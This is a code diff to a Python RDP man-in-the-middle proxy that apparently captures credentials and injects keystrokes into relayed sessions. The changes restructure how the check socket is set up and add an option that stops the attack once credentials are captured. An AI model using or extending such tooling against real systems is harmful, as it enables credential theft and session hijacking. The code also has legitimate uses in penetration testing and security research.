@@ -186,6 +186,9 @@ class RDPProxy(threading.Thread):
 
             if From == "Client" and "creds" in self.vars and args.inject:
                 self.send_keyinjection(s_out)
+                
+            if "creds" in self.vars and args.stop:
+                stop_attack(self.check_conn)
         return True
 
 
@@ -230,15 +233,6 @@ def read_data(sock):
 
 
 def open_sockets(port):
-    check_socket.bind((args.bind_ip, args.check_port))
-    check_socket.listen()
-
-    print("Listen for check socket")
-    check_conn, addr = check_socket.accept()
-    
-    print("Check Connection received from %s:%d" % addr)
-    check_conn = check_conn
-    
     local_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     local_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     local_socket.bind((args.bind_ip, args.listen_port))
@@ -254,7 +248,7 @@ def open_sockets(port):
         remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         remote_socket.connect((args.target_host, port))
         
-    return local_conn, remote_socket, check_conn
+    return local_conn, remote_socket
 
 
 def get_ssl_version(sock):
@@ -285,6 +279,7 @@ def get_ssl_version(sock):
 
 
 def stop_attack(check_conn):
+    print("stop attack")
     if args.check_port and check_conn:
         check_conn.close()
     os._exit(0)
@@ -348,8 +343,18 @@ def convert_str_to_scancodes(string):
 
 def run():
     try:
+        check_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        check_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        check_socket.bind((args.bind_ip, args.check_port))
+        check_socket.listen()
+
+        print("Listen for check socket")
+        check_conn, addr = check_socket.accept()
+
+        print("Check Connection received from %s:%d" % addr)
+
         while True:
-            lsock, rsock, check_conn = open_sockets(args.target_port)
+            lsock, rsock = open_sockets(args.target_port)
             RDPProxy(lsock, rsock, check_conn).start()
     except KeyboardInterrupt:
         pass
